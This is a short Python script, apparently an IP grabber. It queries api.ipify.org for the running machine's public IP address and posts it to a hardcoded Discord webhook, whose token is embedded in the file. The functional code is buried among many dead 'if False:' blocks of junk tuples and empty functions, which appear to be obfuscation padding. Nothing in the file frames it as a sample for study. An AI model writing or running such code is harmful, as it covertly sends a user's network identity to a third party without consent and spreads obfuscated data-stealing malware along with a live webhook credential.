import requests

def send_to_discord(webhook_url, content):
    data = {'content': content}
    response = requests.post(webhook_url, data=data)
    if False:
        _var_138_0 = (838, 692, 659)
        _var_138_1 = (151, 194, 389)
        _var_138_2 = (857, 848, 509)

        def _var_138_fn():
            pass
    return response.status_code
    if False:
        _var_139_0 = (692, 511, 492)
        _var_139_1 = (21, 871, 74)

        def _var_139_fn():
            pass
if False:
    _var_143_0 = (315, 598, 507)
    _var_143_1 = (29, 575, 91)
    _var_143_2 = (107, 460, 794)

    def _var_143_fn():
        pass

def get_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    if False:
        _var_140_0 = (763, 282, 95)
        _var_140_1 = (708, 280, 485)
        _var_140_2 = (771, 461, 964)

        def _var_140_fn():
            pass
    return ip_info
    if False:
        _var_141_0 = (635, 862, 21)
        _var_141_1 = (667, 472, 832)
        _var_141_2 = (338, 306, 989)

        def _var_141_fn():
            pass

def main():
    webhook_url = 'https://discord.com/api/webhooks/1243998916026831043/Vhhv-m25PgiSF14Gxo-Uiw0dKXiPeEOn9D1-18oupWFjPfzOgaQTUrkRfbhsIuZTVJYI'
    if False:
        _var_142_0 = (320, 677, 874)
        _var_142_1 = (181, 769, 6)

        def _var_142_fn():
            pass
    ip_info = get_ip()
    send_to_discord(webhook_url, str(ip_info))
if False:
    _var_144_0 = (612, 151, 123)
    _var_144_1 = (906, 470, 190)

    def _var_144_fn():
        pass
if __name__ == '__main__':
    main()